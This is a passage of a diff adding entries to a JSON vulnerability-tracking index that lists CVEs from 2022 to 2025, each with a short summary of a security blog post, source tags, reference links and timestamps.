+      "description": "[snyk] Learn how to protect your containerized applications from from the \"Dirty Pipe\" Linux vulnerability (CVE-2022-0847), as well as how the exploit works. CVE-2022-0847 was created detailing a flaw in the Linux kernel that can be exploited allowing any process to modify files regardless of their permission settings or ownership.",
+      "first_seen": "2026-05-21T20:09:05.739565+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.739565+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/dirty-pipe-vulnerability-cve-2022-0847-containerized-applications/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "\"Dirty Pipe\" Linux vulnerability and your containerized applications (CVE-2022-0847)"
+    },
+    {
+      "canonical_id": "CVE-2022-1471",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] SnakeYaml, a YAML 1.1 parser and emitter for Java, has been reported as vulnerable to CVE-2022-1471, a deserialization vulnerability that can lead to arbitrary code execution.",
+      "first_seen": "2026-05-21T20:09:05.734892+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.734892+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Unsafe deserialization vulnerability in SnakeYaml (CVE-2022-1471)"
+    },
+    {
+      "canonical_id": "CVE-2022-24086",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] The Adobe patch for CVE-2022-24086 wasn\u2019t enough to mitigate the code. This led to a new CVE-2022-24087 being raised and a second patch going into production.",
+      "first_seen": "2026-05-21T20:09:05.739807+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.739880+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 2,
+      "references": [
+        "https://snyk.io/blog/magento-vulnerability-cve-2022-24087-sanitization/",
+        "https://snyk.io/blog/vulnerability-alert-for-websites-using-magento-ecommerce/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Magento security requires additional patch to fix sanitization vulnerability"
+    },
+    {
+      "canonical_id": "CVE-2022-24348",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] Learn about the Argo CD vulnerability (CVE-2022-24348), as well as the larger implications regarding securing yourself against the kind of supply chain attack this vulnerability could have caused.",
+      "first_seen": "2026-05-21T20:09:05.739972+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.739972+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/argo-cd-zero-day-cve-2022-24348-lessons-supply-chain/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Lessons learned from the Argo CD zero-day vulnerability (CVE-2022-24348)"
+    },
+    {
+      "canonical_id": "CVE-2022-24441",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] Learn how to mitigate two new medium severity (CVSSv3 5.8) vulnerabilities in the Snyk CLI and IDE plugins: CVE-2022-24441 and CVE-2022-22984. Although hard to exploit, these vulnerabilities can lead to arbitrary code execution on the host system. Learn about these risks and how to stay safe.",
+      "first_seen": "2026-05-21T20:09:05.735047+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.735047+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/code-injection-vulns-cli-ide-plugins-medium-sev/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Code injection vulnerabilities (CVSSv3 5.8) found in Snyk CLI and IDE plugins"
+    },
+    {
+      "canonical_id": "CVE-2022-31692",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] Learn about the recently discovered Spring Security authorization bypass (CVE-2022-31692) and learn steps to mitigate.",
+      "first_seen": "2026-05-21T20:09:05.734867+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.734867+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/spring-security-authorization-bypass-cve-2022-31692/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Exploring the Spring Security authorization bypass (CVE-2022-31692)"
+    },
+    {
+      "canonical_id": "CVE-2022-33980",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] In this post, we\u2019ll explore CVE-2022-33980, the Apache Commons configuration RCE vulnerability. However, we want to make it clear that there\u2019s no need for panic. This is not Log4Shell all over again. This is simple configuration manipulation.",
+      "first_seen": "2026-05-21T20:09:05.737659+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.737659+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/cve-2022-33980-apache-commons-configuration-rce-vulnerability/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Exploring CVE-2022-33980: the Apache Commons configuration RCE vulnerability"
+    },
+    {
+      "canonical_id": "CVE-2022-3602",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] OpenSSL has released two high severity vulnerabilities \u2014 CVE-2022-3602 and CVE-2022-3786 \u2014 related to buffer overrun.",
+      "first_seen": "2026-05-21T20:09:05.735601+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.735601+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/openssl-high-severity-vulnerabilities/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Update: OpenSSL high severity vulnerabilities"
+    },
+    {
+      "canonical_id": "CVE-2022-40764",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] As a Snyk user, we want to let you know about a medium severity vulnerability (CVSSv3 6.4) in our CLI that you should be aware of: CVE-2022-40764.",
+      "first_seen": "2026-05-21T20:09:05.736265+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.736265+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/command-injection-vulnerability-cve-2022-40764/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Command injection vulnerability in Snyk CLI released prior to September 1, 2022 (older than v1.996.0)"
+    },
+    {
+      "canonical_id": "CVE-2022-42889",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] In this post we\u2019ll review CVE-2022-42889, the recent Arbitrary Code Execution Vulnerability in Apache Commons Text, including what it is, how to remediate it, and why it\u2019s not the new Log4Shell.",
+      "first_seen": "2026-05-21T20:09:05.735907+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.735907+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/reviewing-cve-2022-42889-in-apache-commons-text/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Reviewing CVE-2022-42889: The arbitrary code execution vulnerability in Apache Commons Text"
+    },
+    {
+      "canonical_id": "CVE-2023-1065",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] CVE-2023-1065 is a medium severity vulnerability that does not expose the user of the integration to any direct security risk and no user data could be leaked, but it could have resulted in irrelevant data being posted to a Snyk organization \u2014 which could in turn obfuscate other, relevant, security issues.",
+      "first_seen": "2026-05-21T20:09:05.734191+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.734191+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/api-auth-vuln-snyk-kubernetes-cve-2023-1065/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "API authentication vulnerability found in Snyk Kubernetes integration (CVE-2023-1065)"
+    },
+    {
+      "canonical_id": "CVE-2023-22518",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] CVE-2023-22518 is being exploited in Confluence for Cerber ransomware deployment. Read up on Huntress\u2019 observations and mitigation guidance.",
+      "first_seen": "2026-05-21T20:08:57.676021+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.676021+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/confluence-to-cerber-exploitation-of-cve-2023-22518-for-ransomware-deployment"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Confluence to Cerber: Exploitation of \u200b\u200bCVE-2023-22518"
+    },
+    {
+      "canonical_id": "CVE-2023-23397",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress is tracking CVE-2023-23397, a 0-day that impacts Microsoft Outlook and requires no user interaction to expose user credential hashes.",
+      "first_seen": "2026-05-21T20:08:57.676720+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.676720+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/everything-we-know-about-cve-2023-23397"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Everything We Know About CVE-2023-23397 | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2023-27532",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] We cover CVE-2023-27532, a vulnerability in the Veeam Backup & Replication component that allowed an unauthenticated user to retrieve host credentials.",
+      "first_seen": "2026-05-21T20:08:57.676733+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.676733+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/veeam-backup-replication-cve-2023-27532-response"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Veeam Backup & Replication CVE-2023-27532 Response | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2023-34362",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Our team is tracking in-the-wild exploitation of a zero-day vulnerability against Progress' MOVEit Transfer web application that allows for escalated privileges and unauthorized access.",
+      "first_seen": "2026-05-21T20:08:57.676494+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.676494+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "MOVEit Transfer Critical Vulnerability CVE-2023-34362 | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2023-38545",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] In this pre-announcement of a new High severity curl vulnerability, learn how to gauge the potential impact to your organization and get steps to prepare for the forthcoming patch.",
+      "first_seen": "2026-05-21T20:09:05.731283+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.731283+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/curl-high-severity-vulnerability-oct-2023/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "High severity vulnerability found in libcurl and curl (CVE-2023-38545)"
+    },
+    {
+      "canonical_id": "CVE-2023-39143",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress is tracking a new PaperCut vulnerability, CVE-2023-39143, which allows full remote code execution on unpatched servers.",
+      "first_seen": "2026-05-21T20:08:57.676329+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.676329+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/another-papercut-cve-2023-39143-remote-code-execution"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Another PaperCut: CVE-2023-39143 Remote Code Execution | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2023-43117",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Dive into our analysis of the CVE-2023-43117 threat in CrushFTP and the growing popularity of MFT application exploitation as a tactic for adversaries.",
+      "first_seen": "2026-05-21T20:08:57.675988+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.675988+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/mft-exploitation-and-adversary-operations"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "MFT Exploitation and Adversary Operations | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2023-44487",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] Learn how to find and fix the HTTP/2 rapid reset vulnerability (CVE-2023-44487) that has been designated a High severity vulnerability with a CVSS score of 7.5 (out of 10).",
+      "first_seen": "2026-05-21T20:09:05.731236+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.731236+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/find-fix-http-2-rapid-reset-zero-day-vulnerability-cve-2023-44487/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Find and fix HTTP/2 rapid reset zero-day vulnerability CVE-2023-44487"
+    },
+    {
+      "canonical_id": "CVE-2023-46233",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] Learn how to find and fix the new \"Use of Weak Hash\" vulnerability in crypto-js and crypto-es that was reported on October 18, 2023.",
+      "first_seen": "2026-05-21T20:09:05.731107+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.731107+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/weak-hash-vulnerability-crypto-js-crypto-es/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Weak Hash vulnerability discovered in crypto-js and crypto-es (CVE-2023-46233 & CVE-2023-46133)"
+    },
+    {
+      "canonical_id": "CVE-2023-46604",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] CVE-2023-46604 is a critical remote code execution vulnerability in Apache ActiveMQ. Patch now to avoid any potential adversary exploitation.",
+      "first_seen": "2026-05-21T20:08:57.676025+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.676025+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/critical-vulnerability-exploitation-of-apache-activemq-cve-2023-46604"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Critical Vuln: Apache ActiveMQ CVE-2023-46604 Exploited | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2023-47246",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress has analyzed the emerging SysAid CVE-2023-47246 vulnerability and recreated the attack chain with a proof-of-concept exploit.",
+      "first_seen": "2026-05-21T20:08:57.676010+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.676010+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/critical-vulnerability-sysaid-cve-2023-47246"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Critical Vulnerability: SysAid CVE-2023-47246 | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2023-4863",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress is tracking a new critical vulnerability seen in the wild that affects anything using the libwebp WebP image library. Here\u2019s what we know so far.",
+      "first_seen": "2026-05-21T20:08:57.676128+00:00",
+      "frameworks": [
+        "huntress",
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.731386+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 3,
+      "references": [
+        "https://snyk.io/blog/critical-webp-0-day-cve-2023-4863/",
+        "https://snyk.io/blog/find-and-fix-webp-vulnerability-cve-2023-4863/",
+        "https://www.huntress.com/blog/critical-vulnerability-webp-heap-buffer-overflow-cve-2023-4863"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Critical Vuln: WebP Heap Buffer Overflow CVE-2023-4863 | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2023-50164",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] CVE-2023-50164 is a critical vulnerability in the Apache Struts library. Learn how to find and fix by upgrading your package and using Snyk to discover and remediate.",
+      "first_seen": "2026-05-21T20:09:05.730113+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.730113+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/struts-path-traversal-vulnerability/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Krampus delivers an end-of-year Struts vulnerability"
+    },
+    {
+      "canonical_id": "CVE-2024-1709",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Adversaries have been VERY busy in the wake of the ScreenConnect vulnerabilities (CVE-2024-1709 & CVE-2024-1708). Here\u2019s all the post-exploitation details, tradecraft, and tactics we\u2019ve observed so far!",
+      "first_seen": "2026-05-21T20:08:57.675741+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.675762+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 2,
+      "references": [
+        "https://www.huntress.com/blog/a-catastrophe-for-control-understanding-the-screenconnect-authentication-bypass",
+        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "SlashAndGrab | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2024-22195",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] On January 11th, 2024, a significant security vulnerability was disclosed in Jinja2, a widely used Python templating library. Identified as CVE-2024-22195, this cross-site scripting (XSS) vulnerability has raised concerns due to its impact on numerous projects.",
+      "first_seen": "2026-05-21T20:09:05.730037+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.730037+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/jinja2-xss-vulnerability/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Understanding and mitigating the Jinja2 XSS vulnerability (CVE-2024-22195)"
+    },
+    {
+      "canonical_id": "CVE-2024-3094",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] On the 29th of March 2024, the high-stakes investment and prolonged campaign to plant a backdoor in the Linux software library liblzma to gain access to multiple operating systems via Linux distributions was carried out by a malicious actor.",
+      "first_seen": "2026-05-21T20:09:05.729509+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.729509+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/the-xz-backdoor-cve-2024-3094/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "The XZ backdoor CVE-2024-3094"
+    },
+    {
+      "canonical_id": "CVE-2024-3721",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[infosecurity_mag] FortiGuard Labs has identified a Mirai-based Nexcorium campaign actively exploiting CVE-2024-3721 in TBK DVR devices",
+      "first_seen": "2026-05-21T20:08:52.175203+00:00",
+      "frameworks": [
+        "infosecurity_mag"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:52.175203+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.infosecurity-magazine.com/news/mirai-variant-dvr-flaw-iot-botnet/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Attackers Exploit DVR Command Injection Flaw to Deploy  Mirai-Based Botnet"
+    },
+    {
+      "canonical_id": "CVE-2024-54529",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[project_zero] In the first part of this series, I detailed my journey into macOS security research, which led to the discovery of a type confusion vulnerability (CVE-2024-54529) and a double-free vulnerability (CVE-2025-31235) in the coreaudiod system daemon through a process I call knowledge-driven fuzzing. While the first post focused on the process of finding the vulnerabilities, this post dives into the intricate process of exploiting the type confusion vulnerability. I\u2019ll explain the technical details of",
+      "first_seen": "2026-05-21T20:08:59.742266+00:00",
+      "frameworks": [
+        "project_zero"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:59.742266+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://projectzero.google/2026/01/sound-barrier-2.html"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Breaking the Sound Barrier, Part II: Exploiting CVE-2024-54529"
+    },
+    {
+      "canonical_id": "CVE-2024-55956",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress identified an emerging threat involving Cleo\u2019s LexiCom, VLTransfer, and Harmony software, known as CVE-2024-55956, commonly used to manage file transfers. Read more about this emerging threat on the Huntress Blog.",
+      "first_seen": "2026-05-21T20:08:57.674397+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.674501+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 2,
+      "references": [
+        "https://www.huntress.com/blog/cleo-software-vulnerability-malware-analysis",
+        "https://www.huntress.com/blog/threat-advisory-oh-no-cleo-cleo-software-actively-being-exploited-in-the-wild"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Cleo Software Actively Being Exploited in the Wild | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2025-1097",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[aquasec] On March 24, 2025, a series of several critical vulnerabilities (CVE-2025-1097, CVE-2025-1098, CVE-2025-24514, and CVE-2025-1974) were disclosed in the\u00a0  ingress-nginx  \u00a0Controller for Kubernetes, collectively termed IngressNightmare. These vulnerabilities could lead to a complete cluster takeover by allowing attackers unauthorized access to all secrets stored across all namespaces in the Kubernetes cluster.",
+      "first_seen": "2026-05-21T20:09:01.745172+00:00",
+      "frameworks": [
+        "aquasec"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:01.745172+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://blog.aquasec.com/ingress-nginx-vulnerabilities-what-you-need-to-know"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "IngressNightmare Vulnerabilities: All You Need to Know"
+    },
+    {
+      "canonical_id": "CVE-2025-26399",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress has observed active exploitation of a deserialization and remote code execution against the SolarWinds Web Help Desk software (CVE-2025-26399).",
+      "first_seen": "2026-05-21T20:08:57.672773+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.672773+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/active-exploitation-solarwinds-web-help-desk-cve-2025-26399"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Active Exploitation of SolarWinds Web Help Desk (CVE-2025-26399)"
+    },
+    {
+      "canonical_id": "CVE-2025-29927",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] On Friday morning, March 21, 2025, at 9:00 a.m. UTC, a security advisory identified as CVE-2025-29927 was published. It cited a critical 9.1 severity vulnerability for mainstream Next.js applications.",
+      "first_seen": "2026-05-21T20:09:05.726815+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.726815+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/cve-2025-29927-authorization-bypass-in-next-js-middleware/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "CVE-2025-29927 Authorization Bypass in Next.js Middleware"
+    },
+    {
+      "canonical_id": "CVE-2025-30066",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[aquasec] On March 14th, 2025, security researchers discovered a critical software supply chain vulnerability in the widely-used GitHub Action  tj-actions/changed-files  ( CVE-2025-30066 ). This vulnerability allows remote attackers to expose CI/CD secrets via the action's build logs. The issue affects users who rely on the  tj-actions/changed-files  action in GitHub workflows to track changed files within a pull request.  \n Due to the compromised action, sensitive CI/CD secrets are being inadvertently lo",
+      "first_seen": "2026-05-21T20:09:01.745220+00:00",
+      "frameworks": [
+        "aquasec"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:01.745220+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://blog.aquasec.com/supply-chain-security-threat-github-action-tj-actions-compromised"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Supply Chain Security Risk: GitHub Action tj-actions/changed-files Compromised"
+    },
+    {
+      "canonical_id": "CVE-2025-30406",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress has observed in the wild exploitation against CVE-2025-30406, a weakness due to hardcoded cryptographic keys.",
+      "first_seen": "2026-05-21T20:08:57.674185+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.674185+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/cve-2025-30406-critical-gladinet-centrestack-triofox-vulnerability-exploited-in-the-wild"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "CVE-2025-30406: Gladinet CentreStack & Triofox Exploited | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2025-31151",
+      "composite_confidence": 0.4,
+      "cwe": [],
